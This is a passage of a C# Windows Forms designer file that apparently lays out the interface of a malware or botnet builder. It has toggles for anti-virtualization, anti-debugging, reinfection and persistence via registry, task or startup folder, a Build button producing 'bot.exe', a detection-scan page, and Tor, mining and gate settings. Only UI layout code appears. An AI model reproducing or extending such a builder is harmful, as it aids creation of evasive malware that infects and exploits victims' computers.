            this.sleepCheck.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.sleepCheck.ChechedOffColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.sleepCheck.Checked = false;
            this.sleepCheck.CheckedOnColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.sleepCheck.ForeColor = System.Drawing.Color.White;
            this.sleepCheck.Location = new System.Drawing.Point(421, 82);
            this.sleepCheck.Name = "sleepCheck";
            this.sleepCheck.Size = new System.Drawing.Size(20, 20);
            this.sleepCheck.TabIndex = 19;
            // 
            // sleepLabel
            // 
            this.sleepLabel.AutoSize = true;
            this.sleepLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.sleepLabel.Location = new System.Drawing.Point(447, 84);
            this.sleepLabel.Name = "sleepLabel";
            this.sleepLabel.Size = new System.Drawing.Size(39, 15);
            this.sleepLabel.TabIndex = 18;
            this.sleepLabel.Text = "Sleep";
            // 
            // antiDebugCheck
            // 
            this.antiDebugCheck.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.antiDebugCheck.ChechedOffColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.antiDebugCheck.Checked = false;
            this.antiDebugCheck.CheckedOnColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.antiDebugCheck.ForeColor = System.Drawing.Color.White;
            this.antiDebugCheck.Location = new System.Drawing.Point(421, 52);
            this.antiDebugCheck.Name = "antiDebugCheck";
            this.antiDebugCheck.Size = new System.Drawing.Size(20, 20);
            this.antiDebugCheck.TabIndex = 17;
            // 
            // antiDebugLabel
            // 
            this.antiDebugLabel.AutoSize = true;
            this.antiDebugLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.antiDebugLabel.Location = new System.Drawing.Point(447, 54);
            this.antiDebugLabel.Name = "antiDebugLabel";
            this.antiDebugLabel.Size = new System.Drawing.Size(91, 15);
            this.antiDebugLabel.TabIndex = 16;
            this.antiDebugLabel.Text = "Anti Debugging";
            // 
            // antiVirtCheck
            // 
            this.antiVirtCheck.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.antiVirtCheck.ChechedOffColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.antiVirtCheck.Checked = false;
            this.antiVirtCheck.CheckedOnColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.antiVirtCheck.ForeColor = System.Drawing.Color.White;
            this.antiVirtCheck.Location = new System.Drawing.Point(421, 22);
            this.antiVirtCheck.Name = "antiVirtCheck";
            this.antiVirtCheck.Size = new System.Drawing.Size(20, 20);
            this.antiVirtCheck.TabIndex = 15;
            // 
            // antiVirtLabel
            // 
            this.antiVirtLabel.AutoSize = true;
            this.antiVirtLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.antiVirtLabel.Location = new System.Drawing.Point(447, 24);
            this.antiVirtLabel.Name = "antiVirtLabel";
            this.antiVirtLabel.Size = new System.Drawing.Size(100, 15);
            this.antiVirtLabel.TabIndex = 14;
            this.antiVirtLabel.Text = "Anti Virtualization";
            // 
            // reinfectCheck
            // 
            this.reinfectCheck.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.reinfectCheck.ChechedOffColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.reinfectCheck.Checked = false;
            this.reinfectCheck.CheckedOnColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.reinfectCheck.ForeColor = System.Drawing.Color.White;
            this.reinfectCheck.Location = new System.Drawing.Point(14, 202);
            this.reinfectCheck.Name = "reinfectCheck";
            this.reinfectCheck.Size = new System.Drawing.Size(20, 20);
            this.reinfectCheck.TabIndex = 13;
            // 
            // reinfectLabel
            // 
            this.reinfectLabel.AutoSize = true;
            this.reinfectLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.reinfectLabel.Location = new System.Drawing.Point(40, 204);
            this.reinfectLabel.Name = "reinfectLabel";
            this.reinfectLabel.Size = new System.Drawing.Size(52, 15);
            this.reinfectLabel.TabIndex = 12;
            this.reinfectLabel.Text = "Reinfect";
            // 
            // persistenceCheck
            // 
            this.persistenceCheck.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.persistenceCheck.ChechedOffColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.persistenceCheck.Checked = true;
            this.persistenceCheck.CheckedOnColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.persistenceCheck.ForeColor = System.Drawing.Color.White;
            this.persistenceCheck.Location = new System.Drawing.Point(14, 172);
            this.persistenceCheck.Name = "persistenceCheck";
            this.persistenceCheck.Size = new System.Drawing.Size(20, 20);
            this.persistenceCheck.TabIndex = 11;
            // 
            // persistenceLabel
            // 
            this.persistenceLabel.AutoSize = true;
            this.persistenceLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.persistenceLabel.Location = new System.Drawing.Point(40, 174);
            this.persistenceLabel.Name = "persistenceLabel";
            this.persistenceLabel.Size = new System.Drawing.Size(71, 15);
            this.persistenceLabel.TabIndex = 10;
            this.persistenceLabel.Text = "Persistence";
            // 
            // startupCheck
            // 
            this.startupCheck.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.startupCheck.ChechedOffColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.startupCheck.Checked = true;
            this.startupCheck.CheckedOnColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.startupCheck.ForeColor = System.Drawing.Color.White;
            this.startupCheck.Location = new System.Drawing.Point(14, 22);
            this.startupCheck.Name = "startupCheck";
            this.startupCheck.Size = new System.Drawing.Size(20, 20);
            this.startupCheck.TabIndex = 9;
            this.startupCheck.OnChange += new System.EventHandler(this.StartupCheck_OnChange);
            // 
            // sep2
            // 
            this.sep2.BackColor = System.Drawing.Color.Transparent;
            this.sep2.LineColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(105)))));
            this.sep2.LineThickness = 1;
            this.sep2.Location = new System.Drawing.Point(397, 8);
            this.sep2.Name = "sep2";
            this.sep2.Size = new System.Drawing.Size(20, 240);
            this.sep2.TabIndex = 8;
            this.sep2.Transparency = 255;
            this.sep2.Vertical = true;
            // 
            // sep1
            // 
            this.sep1.BackColor = System.Drawing.Color.Transparent;
            this.sep1.LineColor = System.Drawing.Color.FromArgb(((int)(((byte)(105)))), ((int)(((byte)(105)))), ((int)(((byte)(105)))));
            this.sep1.LineThickness = 1;
            this.sep1.Location = new System.Drawing.Point(194, 8);
            this.sep1.Name = "sep1";
            this.sep1.Size = new System.Drawing.Size(20, 240);
            this.sep1.TabIndex = 7;
            this.sep1.Transparency = 255;
            this.sep1.Vertical = true;
            // 
            // folderStRadio
            // 
            this.folderStRadio.AutoSize = true;
            this.folderStRadio.Location = new System.Drawing.Point(26, 132);
            this.folderStRadio.Name = "folderStRadio";
            this.folderStRadio.Size = new System.Drawing.Size(125, 17);
            this.folderStRadio.TabIndex = 6;
            this.folderStRadio.Text = "Add to Startup Folder";
            this.folderStRadio.UseVisualStyleBackColor = true;
            // 
            // regStRadio
            // 
            this.regStRadio.AutoSize = true;
            this.regStRadio.Location = new System.Drawing.Point(26, 108);
            this.regStRadio.Name = "regStRadio";
            this.regStRadio.Size = new System.Drawing.Size(97, 17);
            this.regStRadio.TabIndex = 5;
            this.regStRadio.Text = "Add to Registry";
            this.regStRadio.UseVisualStyleBackColor = true;
            // 
            // taskStRadio
            // 
            this.taskStRadio.AutoSize = true;
            this.taskStRadio.Location = new System.Drawing.Point(26, 84);
            this.taskStRadio.Name = "taskStRadio";
            this.taskStRadio.Size = new System.Drawing.Size(94, 17);
            this.taskStRadio.TabIndex = 4;
            this.taskStRadio.Text = "Add as a Task";
            this.taskStRadio.UseVisualStyleBackColor = true;
            // 
            // autoStRadio
            // 
            this.autoStRadio.AutoSize = true;
            this.autoStRadio.Checked = true;
            this.autoStRadio.Location = new System.Drawing.Point(26, 60);
            this.autoStRadio.Name = "autoStRadio";
            this.autoStRadio.Size = new System.Drawing.Size(72, 17);
            this.autoStRadio.TabIndex = 3;
            this.autoStRadio.TabStop = true;
            this.autoStRadio.Text = "Automatic";
            this.autoStRadio.UseVisualStyleBackColor = true;
            // 
            // startupLabel
            // 
            this.startupLabel.AutoSize = true;
            this.startupLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.startupLabel.Location = new System.Drawing.Point(40, 24);
            this.startupLabel.Name = "startupLabel";
            this.startupLabel.Size = new System.Drawing.Size(83, 15);
            this.startupLabel.TabIndex = 2;
            this.startupLabel.Text = "Add to Startup";
            // 
            // buildProgressBar
            // 
            this.buildProgressBar.BackColor = System.Drawing.Color.Silver;
            this.buildProgressBar.BorderRadius = 5;
            this.buildProgressBar.Location = new System.Drawing.Point(20, 383);
            this.buildProgressBar.MaximumValue = 100;
            this.buildProgressBar.Name = "buildProgressBar";
            this.buildProgressBar.ProgressColor = System.Drawing.Color.Teal;
            this.buildProgressBar.Size = new System.Drawing.Size(420, 23);
            this.buildProgressBar.TabIndex = 1;
            this.buildProgressBar.Value = 0;
            // 
            // mainSettings
            // 
            this.mainSettings.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.mainSettings.BorderRadius = 5;
            this.mainSettings.BottomSahddow = false;
            this.mainSettings.color = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.mainSettings.Controls.Add(this.browseButton);
            this.mainSettings.Controls.Add(this.fileNameEdit);
            this.mainSettings.Controls.Add(this.innerEdit);
            this.mainSettings.Controls.Add(this.iconBox);
            this.mainSettings.LeftSahddow = false;
            this.mainSettings.Location = new System.Drawing.Point(6, 6);
            this.mainSettings.Name = "mainSettings";
            this.mainSettings.RightSahddow = false;
            this.mainSettings.ShadowDepth = 2;
            this.mainSettings.Size = new System.Drawing.Size(611, 107);
            this.mainSettings.TabIndex = 0;
            // 
            // browseButton
            // 
            this.browseButton.Activecolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.browseButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.browseButton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.browseButton.BorderRadius = 2;
            this.browseButton.ButtonText = "";
            this.browseButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.browseButton.DisabledColor = System.Drawing.Color.Gray;
            this.browseButton.Iconcolor = System.Drawing.Color.Transparent;
            this.browseButton.Iconimage = ((System.Drawing.Image)(resources.GetObject("browseButton.Iconimage")));
            this.browseButton.Iconimage_right = null;
            this.browseButton.Iconimage_right_Selected = null;
            this.browseButton.Iconimage_Selected = null;
            this.browseButton.IconMarginLeft = 0;
            this.browseButton.IconMarginRight = 0;
            this.browseButton.IconRightVisible = false;
            this.browseButton.IconRightZoom = 0D;
            this.browseButton.IconVisible = false;
            this.browseButton.IconZoom = 50D;
            this.browseButton.IsTab = false;
            this.browseButton.Location = new System.Drawing.Point(571, 62);
            this.browseButton.Name = "browseButton";
            this.browseButton.Normalcolor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.browseButton.OnHovercolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.browseButton.OnHoverTextColor = System.Drawing.Color.White;
            this.browseButton.selected = false;
            this.browseButton.Size = new System.Drawing.Size(30, 30);
            this.browseButton.TabIndex = 11;
            this.browseButton.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.browseButton.Textcolor = System.Drawing.Color.White;
            this.browseButton.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.browseButton.Load += new System.EventHandler(this.FixButtonIcon);
            this.browseButton.Click += new System.EventHandler(this.BrowseButton_Click);
            // 
            // fileNameEdit
            // 
            this.fileNameEdit.BorderColorFocused = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.fileNameEdit.BorderColorIdle = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.fileNameEdit.BorderColorMouseHover = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.fileNameEdit.BorderThickness = 2;
            this.fileNameEdit.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.fileNameEdit.Font = new System.Drawing.Font("Century Gothic", 9.75F);
            this.fileNameEdit.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.fileNameEdit.isPassword = false;
            this.fileNameEdit.Location = new System.Drawing.Point(102, 62);
            this.fileNameEdit.Margin = new System.Windows.Forms.Padding(4);
            this.fileNameEdit.Name = "fileNameEdit";
            this.fileNameEdit.Size = new System.Drawing.Size(462, 30);
            this.fileNameEdit.TabIndex = 3;
            this.fileNameEdit.Text = "C:\\Users\\user\\Desktop\\bot.exe";
            this.fileNameEdit.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            // 
            // innerEdit
            // 
            this.innerEdit.BorderColorFocused = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.innerEdit.BorderColorIdle = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.innerEdit.BorderColorMouseHover = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.innerEdit.BorderThickness = 2;
            this.innerEdit.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.innerEdit.Font = new System.Drawing.Font("Century Gothic", 9.75F);
            this.innerEdit.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.innerEdit.isPassword = false;
            this.innerEdit.Location = new System.Drawing.Point(102, 17);
            this.innerEdit.Margin = new System.Windows.Forms.Padding(4);
            this.innerEdit.Name = "innerEdit";
            this.innerEdit.Size = new System.Drawing.Size(462, 30);
            this.innerEdit.TabIndex = 2;
            this.innerEdit.Text = "orion.exe";
            this.innerEdit.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            // 
            // iconBox
            // 
            this.iconBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.iconBox.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("iconBox.BackgroundImage")));
            this.iconBox.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.iconBox.ContextMenuStrip = this.iconMenu;
            this.iconBox.Location = new System.Drawing.Point(5, 10);
            this.iconBox.Name = "iconBox";
            this.iconBox.Size = new System.Drawing.Size(90, 90);
            this.iconBox.TabIndex = 1;
            this.iconBox.TabStop = false;
            // 
            // iconMenu
            // 
            this.iconMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.addIconToolStripMenuItem,
            this.removeIconToolStripMenuItem});
            this.iconMenu.Name = "iconMenu";
            this.iconMenu.Size = new System.Drawing.Size(144, 48);
            // 
            // addIconToolStripMenuItem
            // 
            this.addIconToolStripMenuItem.Name = "addIconToolStripMenuItem";
            this.addIconToolStripMenuItem.Size = new System.Drawing.Size(143, 22);
            this.addIconToolStripMenuItem.Text = "Add Icon";
            this.addIconToolStripMenuItem.Click += new System.EventHandler(this.AddIconToolStripMenuItem_Click);
            // 
            // removeIconToolStripMenuItem
            // 
            this.removeIconToolStripMenuItem.Name = "removeIconToolStripMenuItem";
            this.removeIconToolStripMenuItem.Size = new System.Drawing.Size(143, 22);
            this.removeIconToolStripMenuItem.Text = "Remove Icon";
            this.removeIconToolStripMenuItem.Click += new System.EventHandler(this.RemoveIconToolStripMenuItem_Click);
            // 
            // buildButton
            // 
            this.buildButton.Activecolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.buildButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.buildButton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.buildButton.BorderRadius = 2;
            this.buildButton.ButtonText = "  Build";
            this.buildButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.buildButton.DisabledColor = System.Drawing.Color.Gray;
            this.buildButton.Iconcolor = System.Drawing.Color.Transparent;
            this.buildButton.Iconimage = ((System.Drawing.Image)(resources.GetObject("buildButton.Iconimage")));
            this.buildButton.Iconimage_right = null;
            this.buildButton.Iconimage_right_Selected = null;
            this.buildButton.Iconimage_Selected = null;
            this.buildButton.IconMarginLeft = 0;
            this.buildButton.IconMarginRight = 0;
            this.buildButton.IconRightVisible = false;
            this.buildButton.IconRightZoom = 0D;
            this.buildButton.IconVisible = false;
            this.buildButton.IconZoom = 50D;
            this.buildButton.IsTab = false;
            this.buildButton.Location = new System.Drawing.Point(456, 373);
            this.buildButton.Name = "buildButton";
            this.buildButton.Normalcolor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.buildButton.OnHovercolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.buildButton.OnHoverTextColor = System.Drawing.Color.White;
            this.buildButton.selected = false;
            this.buildButton.Size = new System.Drawing.Size(151, 45);
            this.buildButton.TabIndex = 9;
            this.buildButton.Text = "  Build";
            this.buildButton.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.buildButton.Textcolor = System.Drawing.Color.White;
            this.buildButton.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.buildButton.Load += new System.EventHandler(this.FixButtonIcon);
            this.buildButton.Click += new System.EventHandler(this.BuildButton_Click);
            // 
            // Page6
            // 
            this.Page6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(26)))), ((int)(((byte)(26)))));
            this.Page6.Controls.Add(this.progressLabel);
            this.Page6.Controls.Add(this.scanButton);
            this.Page6.Controls.Add(this.resultBox);
            this.Page6.Controls.Add(this.browseButton2);
            this.Page6.Controls.Add(this.fileNameEdit2);
            this.Page6.Location = new System.Drawing.Point(4, 5);
            this.Page6.Name = "Page6";
            this.Page6.Padding = new System.Windows.Forms.Padding(3);
            this.Page6.Size = new System.Drawing.Size(623, 451);
            this.Page6.TabIndex = 5;
            this.Page6.Text = "tabPage6";
            // 
            // progressLabel
            // 
            this.progressLabel.AutoSize = true;
            this.progressLabel.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.progressLabel.Location = new System.Drawing.Point(249, 208);
            this.progressLabel.Name = "progressLabel";
            this.progressLabel.Size = new System.Drawing.Size(126, 20);
            this.progressLabel.TabIndex = 16;
            this.progressLabel.Text = "Scan in progress...";
            this.progressLabel.Visible = false;
            // 
            // scanButton
            // 
            this.scanButton.Activecolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.scanButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.scanButton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.scanButton.BorderRadius = 2;
            this.scanButton.ButtonText = "  Scan";
            this.scanButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.scanButton.DisabledColor = System.Drawing.Color.Gray;
            this.scanButton.Iconcolor = System.Drawing.Color.Transparent;
            this.scanButton.Iconimage = ((System.Drawing.Image)(resources.GetObject("scanButton.Iconimage")));
            this.scanButton.Iconimage_right = null;
            this.scanButton.Iconimage_right_Selected = null;
            this.scanButton.Iconimage_Selected = null;
            this.scanButton.IconMarginLeft = 0;
            this.scanButton.IconMarginRight = 0;
            this.scanButton.IconRightVisible = false;
            this.scanButton.IconRightZoom = 0D;
            this.scanButton.IconVisible = false;
            this.scanButton.IconZoom = 50D;
            this.scanButton.IsTab = false;
            this.scanButton.Location = new System.Drawing.Point(456, 374);
            this.scanButton.Name = "scanButton";
            this.scanButton.Normalcolor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.scanButton.OnHovercolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.scanButton.OnHoverTextColor = System.Drawing.Color.White;
            this.scanButton.selected = false;
            this.scanButton.Size = new System.Drawing.Size(151, 45);
            this.scanButton.TabIndex = 1;
            this.scanButton.Text = "  Scan";
            this.scanButton.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.scanButton.Textcolor = System.Drawing.Color.White;
            this.scanButton.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.scanButton.Load += new System.EventHandler(this.FixButtonIcon);
            this.scanButton.Click += new System.EventHandler(this.ScanButton_Click);
            // 
            // resultBox
            // 
            this.resultBox.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.resultBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.resultBox.Location = new System.Drawing.Point(174, 44);
            this.resultBox.Name = "resultBox";
            this.resultBox.Size = new System.Drawing.Size(275, 375);
            this.resultBox.TabIndex = 14;
            this.resultBox.TabStop = false;
            // 
            // browseButton2
            // 
            this.browseButton2.Activecolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.browseButton2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.browseButton2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.browseButton2.BorderRadius = 2;
            this.browseButton2.ButtonText = "";
            this.browseButton2.Cursor = System.Windows.Forms.Cursors.Hand;
            this.browseButton2.DisabledColor = System.Drawing.Color.Gray;
            this.browseButton2.Iconcolor = System.Drawing.Color.Transparent;
            this.browseButton2.Iconimage = ((System.Drawing.Image)(resources.GetObject("browseButton2.Iconimage")));
            this.browseButton2.Iconimage_right = null;
            this.browseButton2.Iconimage_right_Selected = null;
            this.browseButton2.Iconimage_Selected = null;
            this.browseButton2.IconMarginLeft = 0;
            this.browseButton2.IconMarginRight = 0;
            this.browseButton2.IconRightVisible = false;
            this.browseButton2.IconRightZoom = 0D;
            this.browseButton2.IconVisible = false;
            this.browseButton2.IconZoom = 50D;
            this.browseButton2.IsTab = false;
            this.browseButton2.Location = new System.Drawing.Point(530, 7);
            this.browseButton2.Name = "browseButton2";
            this.browseButton2.Normalcolor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.browseButton2.OnHovercolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.browseButton2.OnHoverTextColor = System.Drawing.Color.White;
            this.browseButton2.selected = false;
            this.browseButton2.Size = new System.Drawing.Size(30, 30);
            this.browseButton2.TabIndex = 13;
            this.browseButton2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.browseButton2.Textcolor = System.Drawing.Color.White;
            this.browseButton2.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.browseButton2.Load += new System.EventHandler(this.FixButtonIcon);
            this.browseButton2.Click += new System.EventHandler(this.BrowseButton2_Click);
            // 
            // fileNameEdit2
            // 
            this.fileNameEdit2.BorderColorFocused = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.fileNameEdit2.BorderColorIdle = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.fileNameEdit2.BorderColorMouseHover = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.fileNameEdit2.BorderThickness = 2;
            this.fileNameEdit2.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.fileNameEdit2.Font = new System.Drawing.Font("Century Gothic", 9.75F);
            this.fileNameEdit2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.fileNameEdit2.isPassword = false;
            this.fileNameEdit2.Location = new System.Drawing.Point(61, 7);
            this.fileNameEdit2.Margin = new System.Windows.Forms.Padding(4);
            this.fileNameEdit2.Name = "fileNameEdit2";
            this.fileNameEdit2.Size = new System.Drawing.Size(462, 30);
            this.fileNameEdit2.TabIndex = 2;
            this.fileNameEdit2.Text = "C:\\Users\\user\\Desktop\\bot.exe";
            this.fileNameEdit2.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            // 
            // Page7
            // 
            this.Page7.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(26)))), ((int)(((byte)(26)))));
            this.Page7.Controls.Add(this.torCheck1);
            this.Page7.Controls.Add(this.torLabel1);
            this.Page7.Controls.Add(this.TorButton);
            this.Page7.Controls.Add(this.RILabel);
            this.Page7.Controls.Add(this.apiTextBox);
            this.Page7.Controls.Add(this.resetButton);
            this.Page7.Controls.Add(this.apiLabel);
            this.Page7.Controls.Add(this.RITextBox);
            this.Page7.Controls.Add(this.prefixLabel);
            this.Page7.Controls.Add(this.prefixTextBox);
            this.Page7.Controls.Add(this.saveButton);
            this.Page7.Controls.Add(this.miningLabel1);
            this.Page7.Controls.Add(this.miningTextBox);
            this.Page7.Controls.Add(this.intervalSlider);
            this.Page7.Controls.Add(this.intervalLabel);
            this.Page7.Controls.Add(this.gateLabel);
            this.Page7.Controls.Add(this.gateTextBox);
            this.Page7.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Page7.Location = new System.Drawing.Point(4, 5);
            this.Page7.Name = "Page7";
            this.Page7.Padding = new System.Windows.Forms.Padding(3);
            this.Page7.Size = new System.Drawing.Size(623, 451);
            this.Page7.TabIndex = 6;
            this.Page7.Text = "tabPage7";
            // 
            // torCheck1
            // 
            this.torCheck1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.torCheck1.ChechedOffColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.torCheck1.Checked = false;
            this.torCheck1.CheckedOnColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.torCheck1.ForeColor = System.Drawing.Color.White;
            this.torCheck1.Location = new System.Drawing.Point(89, 315);
            this.torCheck1.Name = "torCheck1";
            this.torCheck1.Size = new System.Drawing.Size(20, 20);
            this.torCheck1.TabIndex = 20;
            // 
            // torLabel1
            // 
            this.torLabel1.AutoSize = true;
